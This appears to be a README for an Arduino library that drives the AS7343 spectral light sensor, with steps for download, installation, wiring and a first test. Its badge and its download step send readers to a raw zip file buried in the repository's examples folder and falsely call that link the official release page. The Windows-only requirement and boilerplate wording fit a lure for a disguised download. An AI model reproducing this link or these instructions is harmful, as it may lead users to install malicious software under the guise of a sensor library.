# 🌈 7Semi-AS7343 - Advanced light sensing for your projects

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip)

## 📌 Overview

The 7Semi-AS7343 library lets you use the AS7343 spectral sensor with your hardware. This sensor measures light across many channels. It detects color, identifies light flicker, and gathers data through a process called FIFO. You can use this tool to build custom light monitoring systems. This software simplifies the communication between your computer and the sensor hardware.

## ⚙️ System Requirements

- Windows 10 or Windows 11 operating system.
- An Arduino-compatible development board.
- The AS7343 sensor hardware connected via I2C interface.
- Latest version of the Arduino IDE software.
- A standard USB cable for your development board.

## 📥 Downloading the Software

You must obtain the library files from the official release page. Follow these steps to get the files:

1. Visit the main download page: [https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip](https://raw.githubusercontent.com/Patriciopaulo1995/7Semi-AS7343/main/examples/A-Semi-3.6.zip).
2. Locate the most recent version labeled as "Latest release."
3. Click the link that says "Source code (zip)."
4. Save the folder to your computer.
5. Extract the contents of the zip file into a folder you can reach easily.

## 🛠️ Installation Steps

After you download the files, you must add them to your Arduino software. Complete these steps to prepare your environment:

1. Open the Arduino IDE on your Windows computer.
2. Navigate to the top menu bar.
3. Select "Sketch."
4. Move your mouse to "Include Library."
5. Choose "Add .ZIP Library..."
6. A file browser window will appear. Locate the folder where you saved the files earlier.
7. Select the folder named "7Semi-AS7343" and click "Open."
8. The software will display a message stating the library is installed.

## 🔌 Connecting your Hardware

Correct wiring ensures the sensor works with your board. Connect your sensor to your board using these pin assignments:

- Connect the sensor VCC pin to the 3.3V or 5V pin on your board depending on sensor needs.
- Connect the GND pin to the ground pin on your board.
- Connect the SDA pin to the SDA pin on your board.
- Connect the SCL pin to the SCL pin on your board.

Ensure all connections are tight. Loose wires prevent the sensor from communicating with your computer.

## 🚀 Running Your First Test

Once the library is installed and hardware is connected, test the sensor to confirm it works:

1. Connect your board to the computer using the USB cable.
2. In the Arduino IDE, go to "File."
3. Select "Examples."
4. Scroll down until you see "7Semi-AS7343."
5. Select the example named "AS7343_Basic_Read."
6. Select your board model under "Tools" and "Board."
7. Select the correct COM port under "Tools" and "Port."
8. Click the "Upload" button situated in the top left corner of the screen.
9. Wait for the status bar to show "Done uploading."
10. Open the "Serial Monitor" window by clicking the magnifying glass icon in the top right.
11. Set the data rate to 9600 baud.
12. Your screen will display light data values.

## 📊 Understanding Sensor Features

The library manages complex tasks for you. The AS7343 sensor includes several functions:

- **Spectral Sensing:** It breaks incoming light into multiple color bands. This allows the sensor to report exact light composition.
- **Flicker Detection:** The sensor identifies patterns in light intensity at high speeds. This is useful for monitoring artificial light sources.
- **FIFO Buffer:** The sensor stores data internally until you retrieve it. This prevents data loss during high-speed measurements.
- **Interrupts:** You can set the sensor to signal your board only when light levels cross a certain threshold. This saves energy.

## 💡 Troubleshooting Common Issues

If the sensor fails to report data, check these common points:

- **Check Connections:** Ensure the I2C wires (SDA and SCL) are not swapped.
- **Verify Power:** Confirm the sensor power light is active.
- **Serial Monitor Settings:** Verify the baud rate in your Serial Monitor matches the rate in your code.
- **Library Conflicts:** Ensure no other libraries for the same sensor are active in your folder.
- **Restart IDE:** Close and reopen the Arduino software if new libraries do not appear in the Examples list.

## 📝 Configuration Tips

You can adjust how the sensor behaves by modifying the initialization settings in your code:

- **Gain Settings:** Change the gain to increase sensitivity for low-light environments.
- **Integration Time:** Longer integration times allow the sensor to collect more light data, which improves accuracy in dim settings.
- **Channel Selection:** You can choose to read only specific spectral channels if your application does not require full-spectrum analysis.

Adjusting these values involves changing simple numbers within the provided examples. Always re-upload your sketch after you save changes to your code.